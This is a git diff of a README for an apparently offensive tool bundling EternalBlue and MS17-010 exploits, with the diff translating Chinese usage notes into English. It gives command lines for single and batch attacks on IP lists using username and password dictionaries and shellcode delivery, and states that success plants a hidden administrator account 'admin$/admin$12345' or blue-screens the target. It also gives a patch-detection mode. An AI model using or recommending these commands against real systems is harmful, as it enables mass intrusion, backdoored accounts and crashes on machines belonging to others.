@@ -1,10 +1,7 @@
 # ms17010-nsa-EternalBlue
 integration ms17010 and nsa-EternalBlue
 
-主要集成nsa的永恒之蓝和ms17010系列poc。
-永恒之蓝poc有windows 7/2008 和 windows 8/2012 x64
-ms17010 则是win all，Windows Vista以下可以匿名成功获取system权限，
-vista以上则需要 命名管道 接入权限，一般需要域用户权限。
+Mainly integrated with nsa's Eternal Blue and ms17010 series poc. Eternal blue poc has windows 7/2008 and windows 8/2012 x64 ms17010 is win all, Windows Vista can successfully obtain system permissions anonymously, vista above requires named pipe access permissions, generally requires domain user permissions.
 
 Usage: "usage:MyExploiter.py [options] target"
 
@@ -36,27 +33,28 @@ Options:
 						
   -b BATCH, --batch=BATCH    batch file,execute batch file on target
   
-  eg:
-  模式0：自动执行ms17010攻击，攻击成功后靶机增加管理员账号admin$/admin$12345 
+Eg: Mode 0: The ms17010 attack is automatically executed. After the attack is successful, the target machine increases the administrator account admin$/admin$12345.
   
-  ms17010EXP 192.168.1.10 || ms17010EXP -U user.txt        --pwds=pwd.txt -t(线程数) 2 192.168.1.10
+ms17010EXP 192.168.1.10 || ms17010EXP -U user.txt --pwds=pwd.txt -t (number of threads) 2 192.168.1.10
   
-  模式1：批量执行ms17010攻击，攻击成功后靶机增加管理员账号admin$/admin$12345  
+Mode 1: Execute the ms17010 attack in batches. After the attack is successful, the target machine increases the administrator account admin$/admin$12345.
   
-  ms17010EXP -m 1 ip.txt || ms17010EXP -m 1 -U user.txt --pwds=pwd.txt -t(线程数) 2 ip.txt
+ms17010EXP -m 1 ip.txt || ms17010EXP -m 1 -U user.txt --pwds=pwd.txt -t(threads) 2 ip.txt
   
-  模式2：执行永恒之蓝攻击，shellcode为shellcode.bin,成功后靶机或蓝屏或增加用户admin$/admin$12345 
+Mode 2: Execute the Eternal Blue attack, shellcode is shellcode.bin, successful target or blue screen or add user admin$/admin$12345
   
-  ms17010EXP -m 2 192.168.1.10
+ms17010EXP -m 2 192.168.1.10
   
-  模式3，批量永恒之蓝攻击，ms17010EXP -m 3 ip.txt
+Mode 3, batch eternal blue attack, ms17010EXP -m 3 ip.txt
   
-  模式4，检测靶机是否打补丁及命名管道的接入情况  ms17010EXP -m 4 192.168.1.10
+Mode 4, detecting whether the target machine is patched and the access status of the named pipe ms17010EXP -m 4 192.168.1.10
   
-  模式5，批量检测 ms17010EXP -m 5 -t 2 --users=user.txt --pwds=pwd.txt ip.txt
+Mode 5, batch detection ms17010EXP -m 5 -t 2 --users=user.txt --pwds=pwd.txt ip.txt
 
-  注意：用户名字典 密码字典 最后一行置空，即每行必须有换行符。
+Note: The last line of the username dictionary password dictionary is blank, that is, each line must have a newline.
   
 						
-基于：https://github.com/worawit/MS17-010 
+Based on: https://github.com/worawit/MS17-010
+
+## Credit to zzwlpx
 
